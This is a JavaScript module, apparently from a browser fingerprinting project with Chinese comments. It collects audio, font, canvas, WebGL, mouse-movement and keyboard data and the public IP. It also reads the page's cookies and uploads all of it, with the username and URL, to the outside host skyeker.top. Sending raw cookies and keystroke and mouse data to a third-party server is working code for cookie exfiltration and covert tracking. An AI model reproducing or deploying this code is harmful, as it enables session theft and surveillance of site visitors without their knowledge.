import { getAudioFingerprint } from './audio.js';
import { getFontsFingerprint } from './fonts.js';
import { getCanvasFingerprint } from './canvas.js';
import { getWebGLFingerprint } from './webgl.js';
import { getMouseMovementData } from './mousemove.js';
import { getKeyboardData } from './keyboard.js';
//import { getCookieFingerprint, getIPFingerprint } from './extra.js'; // 新增
import { getLevelOneSignals } from './level1.js';
import { getLevel2Signals } from './level2.js';
import { getLevel3Signals } from './level3.js';
export async function getFingerprint(username = '') {
    try {
        const audio = await getAudioFingerprint();
        const fonts = await getFontsFingerprint();
        const canvas = await getCanvasFingerprint();
        const webgl = await getWebGLFingerprint();
        const mouse = getMouseMovementData();
        const keyboard = getKeyboardData();
        const level1Signals = getLevelOneSignals();
        const level2Signals = await getLevel2Signals();
        const level3Signals = await getLevel3Signals();

        const fingerprint = {
            audio,
            fonts,
            canvas,
            webgl,
            mouse,
            keyboard,
            level1Signals,
            level2Signals,
            level3Signals
        };

        const url = window.location.href;
        const cookie = document.cookie || '';
        let ip = '';
        try {
            const res = await fetch("https://api.ipify.org?format=json");
            const data = await res.json();
            ip = data.ip;
        } catch (e) {
            console.warn("获取公网IP失败:", e);
        }

        const res = await fetch("https://skyeker.top/fingerprint", {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, fingerprint, url, ip, cookie }),
            credentials: 'include'
        });

        const data = await res.json();
        return data.fingerprint;
    } catch (e) {
        console.error('指纹上传失败:', e);
        return 'unknown';
    }
}

